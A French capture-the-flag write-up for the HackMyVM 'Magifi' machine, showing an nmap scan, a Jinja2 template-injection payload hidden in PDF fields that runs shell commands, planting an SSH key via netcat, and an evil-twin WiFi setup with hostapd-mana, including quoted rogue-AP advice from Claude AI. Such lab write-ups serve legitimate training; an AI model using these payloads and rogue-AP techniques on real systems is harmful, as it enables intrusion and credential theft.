---
title: "Solution du CTF Magifi de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### Lumos

Magifi est un très bon CTF proposé par [x4v1l0k](https://hackmyvm.eu/profile/?user=x4v1l0k) sur HackMyVM.eu. Il est plutôt corsé, mais permet de découvrir (ou redécouvrir) des exploitations intéressantes.

C'est malheureusement assez commun, mais la VM ne trouvait pas d'adresse IP dans mon VMWare Workstation.

J'ai donc édité l'entrée GRUB comme je le fais dans ce genre de cas, histoire d'obtenir un shell et rajouter un utilisateur privilégié pour chercher ce qui cloche après un redémarrage normal.

```console
$ dhclient
Unsupported device 803 for "wmsim0"
```

En général après cette commande ça fonctionne et on n'en par le plus... Investiguons.

Un `ip link show wmsim0` m'indique que cette interface n'existe pas, c'est pourtant celle que `dhclient` tente de configurer.

Dans la liste des interfaces réseau je remarque `ens32` qui devrait mieux correspondre à ma machine.

Or le fichier `/etc/network/interfaces`  mentionne `enp0s3`. Je corrige ça avec cette commande :

```bash
sed -i 's/enp0s3/ens32/g' /etc/network/interfaces
```

Je peux ensuite relancer le service `networking` et tout ce qui en dépend :

```bash
systemctl restart networking
```

### Accio Shell

Je lance un Nmap des familles avec l'option pour remonter les vulnérabilités liées aux versions logiciels :

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.242.132
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.242.132
Host is up (0.00061s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|       CVE-2023-38408  9.8     https://vulners.com/cve/CVE-2023-38408
|       B8190CDB-3EB9-5631-9828-8064A1575B23    9.8     https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23  *EXPLOIT*
|       8FC9C5AB-3968-5F3C-825E-E8DB5379A623    9.8     https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623  *EXPLOIT*
|       8AD01159-548E-546E-AA87-2DE89F3927EC    9.8     https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    9.8     https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       2227729D-6700-5C8F-8930-1EEAFD4B9FF0    9.8     https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0  *EXPLOIT*
|       0221525F-07F5-5790-912D-F4B9E2D1B587    9.8     https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587  *EXPLOIT*
|       CVE-2020-15778  7.8     https://vulners.com/cve/CVE-2020-15778
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       PACKETSTORM:173661      7.5     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
|       F0979183-AE88-53B4-86CF-3AF0523F3807    7.5     https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807  *EXPLOIT*
|       CVE-2020-12062  7.5     https://vulners.com/cve/CVE-2020-12062
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
|       CVE-2021-28041  7.1     https://vulners.com/cve/CVE-2021-28041
|       CVE-2021-41617  7.0     https://vulners.com/cve/CVE-2021-41617
|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283      *EXPLOIT*
|       F79E574D-30C8-5C52-A801-66FFA0610BAA    6.8     https://vulners.com/githubexploit/F79E574D-30C8-5C52-A801-66FFA0610BAA  *EXPLOIT*
|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918        *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
|       CVE-2023-51385  6.5     https://vulners.com/cve/CVE-2023-51385
|       CVE-2023-48795  5.9     https://vulners.com/cve/CVE-2023-48795
|       CVE-2020-14145  5.9     https://vulners.com/cve/CVE-2020-14145
|       54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C    5.9     https://vulners.com/githubexploit/54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C  *EXPLOIT*
|       CVE-2016-20012  5.3     https://vulners.com/cve/CVE-2016-20012
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2021-36368  3.7     https://vulners.com/cve/CVE-2021-36368
|_      PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
80/tcp open  http    Werkzeug httpd 3.0.4 (Python 3.8.10)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Werkzeug/3.0.4 Python/3.8.10
| vulners: 
|   cpe:/a:python:python:3.8.10: 
|       VERACODE:43894  9.8     https://vulners.com/veracode/VERACODE:43894
|       CVE-2022-37454  9.8     https://vulners.com/cve/CVE-2022-37454
|       CVE-2021-29921  9.8     https://vulners.com/cve/CVE-2021-29921
|       CVE-2019-12900  9.8     https://vulners.com/cve/CVE-2019-12900
|       CVE-2007-4559   9.8     https://vulners.com/cve/CVE-2007-4559
|       CVE-2022-42919  7.8     https://vulners.com/cve/CVE-2022-42919
|       CVE-2015-20107  7.6     https://vulners.com/cve/CVE-2015-20107
|       DA7CD4B2-2AD0-5735-A5DE-26D392D51DDA    7.5     https://vulners.com/githubexploit/DA7CD4B2-2AD0-5735-A5DE-26D392D51DDA  *EXPLOIT*
|       CVE-2024-7592   7.5     https://vulners.com/cve/CVE-2024-7592
|       CVE-2024-6232   7.5     https://vulners.com/cve/CVE-2024-6232
|       CVE-2023-36632  7.5     https://vulners.com/cve/CVE-2023-36632
|       CVE-2023-24329  7.5     https://vulners.com/cve/CVE-2023-24329
|       CVE-2022-45061  7.5     https://vulners.com/cve/CVE-2022-45061
|       CVE-2022-0391   7.5     https://vulners.com/cve/CVE-2022-0391
|       CVE-2021-3737   7.5     https://vulners.com/cve/CVE-2021-3737
|       CVE-2020-10735  7.5     https://vulners.com/cve/CVE-2020-10735
|       CVE-2018-25032  7.5     https://vulners.com/cve/CVE-2018-25032
|       245D4EE1-A03B-5FCC-BDA2-DD48815E487D    7.5     https://vulners.com/githubexploit/245D4EE1-A03B-5FCC-BDA2-DD48815E487D  *EXPLOIT*
|       0317958D-5B98-511C-908C-F9FFCF653A02    7.5     https://vulners.com/githubexploit/0317958D-5B98-511C-908C-F9FFCF653A02  *EXPLOIT*
|       CVE-2021-28861  7.4     https://vulners.com/cve/CVE-2021-28861
|       CVE-2022-26488  7.0     https://vulners.com/cve/CVE-2022-26488
|       CVE-2013-0340   6.8     https://vulners.com/cve/CVE-2013-0340
|       CVE-2021-3733   6.5     https://vulners.com/cve/CVE-2021-3733
|       CVE-2016-3189   6.5     https://vulners.com/cve/CVE-2016-3189
|       VERACODE:43715  5.9     https://vulners.com/veracode/VERACODE:43715
|       CVE-2021-3426   5.7     https://vulners.com/cve/CVE-2021-3426
|       CVE-2024-9287   5.3     https://vulners.com/cve/CVE-2024-9287
|       CVE-2023-40217  5.3     https://vulners.com/cve/CVE-2023-40217
|       CVE-2023-27043  5.3     https://vulners.com/cve/CVE-2023-27043
|_      CVE-2021-4189   5.3     https://vulners.com/cve/CVE-2021-4189
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
MAC Address: 00:0C:29:8C:A9:52 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 530.17 seconds
```

Les CVEs sont relatifs à des problèmes de parsing d'URL dans les librairies de Python, pas de quoi fouetter un elfe de maison.

Sur le port 80 on a vraisemblablement une appli Flask :

```console
$ curl -D- http://192.168.242.132
HTTP/1.1 302 FOUND
Server: Werkzeug/3.0.4 Python/3.8.10
Date: Mon, 12 May 2025 18:11:22 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 225
Location: http://hogwarts.htb
Connection: close

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://hogwarts.htb">http://hogwarts.htb</a>. If not, click the link.
```

On note aussi le domaine custom `hogwarts.htb`. J'ai tenté une énumération de sous-domaines en brute-forçant l'entête HTTP `Host` mais cela n'a rien donné.

La page web dispose d'un formulaire permettant de soumettre une demande d'inscription :

```html
            <h2>Apply to Hogwarts</h2>
            <form action="/upload" method="POST" enctype="multipart/form-data">
                <label for="pdf_file">Submit your application in PDF format:<br><br><a href="/static/application-template.docx" download>Please, use our template</a></label><br><br>
                <input type="file" name="pdf_file" required><br>
                <input type="submit" value="Submit">
            </form>
```

Le template au format `docx` a des placeholders qu'il faut éditer pour mettre son nom, prénom, etc.

C'est assez étonnant de se voir donner un docx alors que le formulaire semble attendre des PDF. J'ai testé d'autres types de fichier et à chaque fois, j'ai obtenu une erreur 500.

Avec un pdf vide, j'obtiens cette réponse :

```html
                    <h1>Application Received</h1>
                    <p>Thank you. Your application to Hogwarts has been successfully submitted with the following data:</p>
                    <p>
                        <ul>
                            <li>Name: </li>
                            <li>Surname: </li>
                            <li>Address: </li>
                            <li>Birthday: </li>
                            <li>Pet Breed: </li>
                            <li>Pet's Name: </li>
                        </ul>
```

Il est évident que l'appli web essaye d'extraire les données depuis le fichier PDF. J'ai immédiatement pensé à une vulnérabilité de SSTI (Server Side Template Injection).

Comme le framework doit être Flask, le language de template doit être Jinja2.

HackTricks a une excellente page sur le sujet : [Jinja2 SSTI - HackTricks](https://book.hacktricks.wiki/fr/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html)

J'ai commencé par le basique pour voir si c'était bien ça, en mettant les valeurs suivantes dans mon PDF :

```
Name: {{ 8 * 3 }}
Surname: {{ 8 * 4 }}
Address: {{ 8 * 5 }}
Birthday: {{ 8 * 6 }}
Pet breed: {{ 8 * 7 }}
Pet’s Name: {{ 8 * 8 }}
```

Bingo !

```html
                        <ul>
                            <li>Name: 24</li>
                            <li>Surname: 32</li>
                            <li>Address: 40</li>
                            <li>Birthday: 48</li>
                            <li>Pet Breed: 56</li>
                            <li>Pet's Name: 64</li>
                        </ul>
```

Ensuite, dans les classes Python chargées en mémoire, il faut en trouver une intéressante. Je peux passer ce code :

```python
{{ dict.__base__.__subclasses__() }}
```

En retour j'obtiens une liste énorme (dont voici le début) :

```
Name: [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>, <class 'code'>...
```

Je remarque la présence de `subprocess.Popen` dans la liste. Reste à savoir en quelle position. J'ai copié/collé la chaine dans une variable Python :

```python
>>> for i, class_ in enumerate(data.split(",")):
...   if "Popen" in class_:
...     print(i)
... 
351
```

Avec cet index, je peux désormais appeler la fonction :

```python
{{ dict.__base__.__subclasses__()[351]('id',shell=True,stdout=-1).communicate()[0].strip() }}
```

Victoire !

```
Name: b'uid=1006(harry_potter) gid=1006(harry_potter) groups=1006(harry_potter)'
```

Maintenant, il est tant d'obtenir un shell. Malheureusement ni `curl` ni `wget` ne sont présents sur le système.

J'ai essayé d'écrire une clé SSH avec `echo` et une redirection, mais bizarrement ça ne fonctionnait pas. Finalement, j'ai mis en écoute un Ncat sur ma machine pour transférer la clé SSH.

Soit `ncat -l -p 9999 -v < key_no_pass.pub` de mon côté et `nc 192.168.242.1 9999 > /home/harry_potter/.ssh/authorized_keys` sur la victime.

J'obtiens alors le premier flag :

```console
$ env
USER=harry_potter
SSH_CLIENT=192.168.242.1 60356 22
XDG_SESSION_TYPE=tty
HOME=/home/harry_potter
MOTD_SHOWN=pam
SSH_TTY=/dev/pts/0
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1006/bus
LOGNAME=harry_potter
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=338
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1006
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/home/harry_potter
SSH_CONNECTION=192.168.242.1 60356 192.168.242.132 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
$ ls
Hogwarts_web  user.txt
$ cat user.txt  
hogwarts{ea4bc74f09fb69771165e57b1b215de9}
$ sudo -l
Matching Defaults entries for harry_potter on MagiFi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry_potter may run the following commands on MagiFi:
    (root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng, /usr/sbin/airodump-ng, /usr/bin/airdecap-ng, /usr/bin/hostapd-mana
```

### Expelliarmus

Au vu des commandes sudo autorisées, on aura sans doute une attaque WiFi à réaliser. Je prends tout de même le temps de fouiller un peu.

```console
harry_potter@MagiFi:~/Hogwarts_web$ find / -type f -perm -u+s -ls 2> /dev/null 
   262629     88 -rwsr-xr-x   1 root     root        88464 Feb  6  2024 /usr/bin/gpasswd
   262241     84 -rwsr-xr-x   1 root     root        85064 Feb  6  2024 /usr/bin/chfn
   262712     40 -rwsr-xr-x   1 root     root        39144 Apr  9  2024 /usr/bin/umount
   275948     44 -rwsr-xr-x   1 root     root        44784 Feb  6  2024 /usr/bin/newgrp
   345098     20 -rwsr-xr-x   1 root     root        17400 Feb 13 07:31 /usr/bin/xxd_horcrux
   276704     68 -rwsr-xr-x   1 root     root        67816 Apr  9  2024 /usr/bin/su
   262825     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount
   262644     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
   263044     32 -rwsr-xr-x   1 root     root        31032 Feb 21  2022 /usr/bin/pkexec
   271591    164 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /usr/bin/sudo
   262707     56 -rwsr-xr-x   1 root     root        55528 Apr  9  2024 /usr/bin/mount
   262715     68 -rwsr-xr-x   1 root     root        68208 Feb  6  2024 /usr/bin/passwd
   262242     52 -rwsr-xr-x   1 root     root        53040 Feb  6  2024 /usr/bin/chsh
   263530     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   332255    468 -rwsr-xr-x   1 root     root       477672 Jan  2  2024 /usr/lib/openssh/ssh-keysign
   274785    152 -rwsr-xr-x   1 root     root       155080 Jul 26  2024 /usr/lib/snapd/snap-confine
   263738     24 -rwsr-xr-x   1 root     root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   345093     12 -rwsr-xr-x   1 root     root        10224 Jan 22  2017 /usr/lib/authbind/helper
   263523     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
      210    177 -rwsr-xr-x   1 root     root         180752 Dec  4 09:13 /snap/snapd/23545/usr/lib/snapd/snap-confine
      293    133 -rwsr-xr-x   1 root     root         135960 Apr 24  2024 /snap/snapd/21759/usr/lib/snapd/snap-confine
      856     84 -rwsr-xr-x   1 root     root          85064 Feb  6  2024 /snap/core20/2434/usr/bin/chfn
      862     52 -rwsr-xr-x   1 root     root          53040 Feb  6  2024 /snap/core20/2434/usr/bin/chsh
      932     87 -rwsr-xr-x   1 root     root          88464 Feb  6  2024 /snap/core20/2434/usr/bin/gpasswd
     1016     55 -rwsr-xr-x   1 root     root          55528 Apr  9  2024 /snap/core20/2434/usr/bin/mount
     1025     44 -rwsr-xr-x   1 root     root          44784 Feb  6  2024 /snap/core20/2434/usr/bin/newgrp
     1040     67 -rwsr-xr-x   1 root     root          68208 Feb  6  2024 /snap/core20/2434/usr/bin/passwd
     1150     67 -rwsr-xr-x   1 root     root          67816 Apr  9  2024 /snap/core20/2434/usr/bin/su
     1151    163 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /snap/core20/2434/usr/bin/sudo
     1209     39 -rwsr-xr-x   1 root     root          39144 Apr  9  2024 /snap/core20/2434/usr/bin/umount
     1298     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1672    467 -rwsr-xr-x   1 root     root              477672 Jan  2  2024 /snap/core20/2434/usr/lib/openssh/ssh-keysign
      850     84 -rwsr-xr-x   1 root     root               85064 Feb  6  2024 /snap/core20/2379/usr/bin/chfn
      856     52 -rwsr-xr-x   1 root     root               53040 Feb  6  2024 /snap/core20/2379/usr/bin/chsh
      926     87 -rwsr-xr-x   1 root     root               88464 Feb  6  2024 /snap/core20/2379/usr/bin/gpasswd
     1010     55 -rwsr-xr-x   1 root     root               55528 Apr  9  2024 /snap/core20/2379/usr/bin/mount
     1019     44 -rwsr-xr-x   1 root     root               44784 Feb  6  2024 /snap/core20/2379/usr/bin/newgrp
     1034     67 -rwsr-xr-x   1 root     root               68208 Feb  6  2024 /snap/core20/2379/usr/bin/passwd
     1144     67 -rwsr-xr-x   1 root     root               67816 Apr  9  2024 /snap/core20/2379/usr/bin/su
     1145    163 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /snap/core20/2379/usr/bin/sudo
     1203     39 -rwsr-xr-x   1 root     root               39144 Apr  9  2024 /snap/core20/2379/usr/bin/umount
     1292     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1666    467 -rwsr-xr-x   1 root     root              477672 Jan  2  2024 /snap/core20/2379/usr/lib/openssh/ssh-keysign
   336671     20 -rwsr-x--x   1 root     tom.riddle         17136 May 12 23:25 /home/tom.riddle/.horcrux.png
```

Le dernier binaire setuid ne semble pas s'exécuter (on obtient une erreur) et le programme `/usr/bin/xxd_horcrux` nous jette aussi.

Un coup de `ltrace` montre qu'il faut être un autre utilisateur pour l'utiliser :

```console
harry_potter@MagiFi:/home/tom.riddle$ ltrace /usr/bin/xxd_horcrux
getuid()                                                                                                                          = 1006
getpwuid(1006, 0x7ffd4087d2f8, 0x7ffd4087d308, 0x7f39d5c3f0eb)                                                                    = 0x7f39d5d4a4a0
strcmp("harry_potter", "tom.riddle")                                                                                              = -12
fwrite("You are not worthy to handle the"..., 1, 42, 0x7f39d5d485c0You are not worthy to handle the Horcrux!
)                                                              = 42
+++ exited (status 1) +++
```

J'ai aussi remarqué quelques tâches CRON à l'aide de [pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy) :

```
/bin/bash /root/startAPs.sh --rcfile /dev/fd/63
/bin/sh -c cp /root/Sources/.horcrux.png /home/tom.riddle/ && chown root:tom.riddle /home/tom.riddle/.horcrux.png && chmod +x /home/tom.riddle/.horcrux.png && chmod u+s /home/tom.riddle/.horcrux.png >/dev/null 2>&1
```

De toute évidence, ça nous amène à plus tard.

La liste des interfaces réseau nous vend du WiFi :

```console
harry_potter@MagiFi:/tmp$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens32: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:8c:a9:52 brd ff:ff:ff:ff:ff:ff
    inet 192.168.242.132/24 brd 192.168.242.255 scope global dynamic ens32
       valid_lft 1696sec preferred_lft 1696sec
    inet6 fe80::20c:29ff:fe8c:a952/64 scope link 
       valid_lft forever preferred_lft forever
14: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:06:98:e0:5f brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
15: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
16: wlan1: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
17: wlan2: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
18: wlan3: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:03:00 brd ff:ff:ff:ff:ff:ff
19: wlan4: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:04:00 brd ff:ff:ff:ff:ff:ff
20: wlan5: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:05:00 brd ff:ff:ff:ff:ff:ff
21: wlan6: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff
75: wlan60: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:3c:00 brd ff:ff:ff:ff:ff:ff
76: hwsim0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap 12:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
78: veth1@if77: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether ce:c5:2a:de:a9:09 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.200.1.1/24 scope global veth1
       valid_lft forever preferred_lft forever
    inet6 fe80::ccc5:2aff:fede:a909/64 scope link 
       valid_lft forever preferred_lft forever
80: veth2@if79: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 1e:ab:1b:cf:c4:89 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet 10.200.2.1/24 scope global veth2
       valid_lft forever preferred_lft forever
    inet6 fe80::1cab:1bff:fecf:c489/64 scope link 
       valid_lft forever preferred_lft forever
```

Je passe l'interface `wlan0`  en mode monitor :

```console
harry_potter@MagiFi:/tmp$ sudo /usr/sbin/airmon-ng start wlan0

Found 1 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
   3846 dhclient

PHY     Interface       Driver          Chipset

phy10   wlan0           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211

                (mac80211 monitor mode vif enabled for [phy10]wlan0 on [phy10]wlan0mon)
                (mac80211 station mode vif disabled for [phy10]wlan0)
phy11   wlan1           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy12   wlan2           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy13   wlan3           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy14   wlan4           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy15   wlan5           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy16   wlan6           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy70   wlan60          mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
```

Puis je lance `aurodump-ng` dessus :

```bash
sudo /usr/sbin/airodump-ng wlan0mon
```

À ce stade, j'observe bien des clients qui tentent d'accéder à un réseau nommé `wifi-college` mais c'est tout :

```

 CH  8 ][ Elapsed: 8 mins ][ 2025-05-13 08:08 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID


 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   64:32:A8:07:6C:40  -29    0 - 1      0       14         wifi-college                                                                                                                          
 (not associated)   64:32:A8:07:6C:41  -29    0 - 1      0       20         wifi-college                                                                                                                          
 (not associated)   64:32:A8:07:6C:43  -29    0 - 1      0       14         wifi-college                                                                                                                          
 (not associated)   64:32:A8:07:6C:42  -29    0 - 1      0       12         wifi-college                                                                                                                          
Quitting...
```

J'ai eu recours à Claude AI pour avoir une piste en lui donnant la liste des commandes `sudo` ainsi que l'output de `airodump`. Voici son retour :

---------------

C'est intéressant. Votre capture montre qu'aucun point d'accès (AP) n'a été détecté, mais vous voyez des clients WiFi non associés qui envoient des "probe requests" pour tenter de se connecter à un réseau nommé "wifi-college".

Ces 4 appareils (identifiés par leurs adresses MAC qui commençent toutes par `64:32:A8:07:6C`) sont en train de chercher activement un réseau WiFi appelé "wifi-college", mais ce réseau n'est apparemment pas disponible dans l'environnement du CTF.

Étant donné que vous avez accès à `hostapd-mana`, cela suggère que vous pourriez avoir besoin de créer un faux point d'accès (rogue AP) qui usurpe le SSID "wifi-college" pour attirer ces clients. C'est une technique classique d'attaque Evil Twin / Rogue AP.

Voici comment procéder :

1. Créez un fichier de configuration pour hostapd-mana (par exemple `/tmp/mana.conf`) avec le contenu suivant :
   
   ```
   interface=wlan1
   ssid=wifi-college
   hw_mode=g
   channel=1
   bssid=12:34:56:78:90:AB
   mana_wpaout=/tmp/wifi-college.hcapx
   ```

2. Lancez le point d'accès malveillant :
   
   ```bash
   sudo hostapd-mana -i wlan1 /tmp/mana.conf
   ```

3. Si vous avez besoin que l'AP émule un réseau WPA/WPA2, modifiez le fichier de configuration comme ceci :
   
   ```
   interface=wlan1
   ssid=wifi-college
   hw_mode=g
   channel=1
   bssid=12:34:56:78:90:AB
   wpa=2
   wpa_passphrase=password123
   wpa_key_mgmt=WPA-PSK
   wpa_pairwise=TKIP CCMP
   rsn_pairwise=CCMP
   mana_wpaout=/tmp/wifi-college.hcapx
   ```

Cette approche pourrait permettre aux clients qui cherchent "wifi-college" de se connecter à votre point d'accès malveillant, et potentiellement capturer leurs informations d'authentification.

Alternativement, vous pourriez avoir besoin de scanner plus longtemps ou sur différents canaux pour détecter des réseaux cachés qui pourraient faire partie du CTF.

------------------------------

J'aurais dû m'attarder plus longuement sur cette dernière phrase. En effet, à ce stade j'avais bien un AP nommé `wifi-college` mais les clients restaient en `not associated`.

J'ai galéré un moment avant d'utiliser l'option `--band` :

```console
$ sudo airodump-ng --band abg wlan0mon
  CH 118 ][ Elapsed: 54 s ][ 2025-05-13 12:35 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:71:22:15  -28       20        0    0  44   54e  WPA2 CCMP   MGT  wifi-college                                                                                                                          
 F0:9F:C2:71:22:17  -28       20        0    0  40   54e  WPA2 CCMP   MGT  wifi-college                                                                                                                          
 F0:9F:C2:71:22:16  -28       20        0    0  36   54e  WPA2 CCMP   MGT  wifi-college                                                                                                                          

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   64:32:A8:07:6C:41  -29    0 - 6      0        4         wifi-college
```

Cette fois je découvre qu'un réseau `wifi-college` existe (ce n'est pas celui que j'ai défini). Je note le BSSID, les channels utilisés et je relance `airodump` :

```bash
sudo airodump-ng --band abg --channel 36,40,44 -w /tmp/capture wlan0mon
```

Cette fois, j'ai bien des clients qui se connectent à mon AP et je parviens même à obtenir des handshakes (sans nécessairement provoquer de `DeAuth`) :

```
 CH 40 ][ Elapsed: 1 min ][ 2025-05-13 12:48 ][ WPA handshake: F0:9F:C2:71:22:16 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

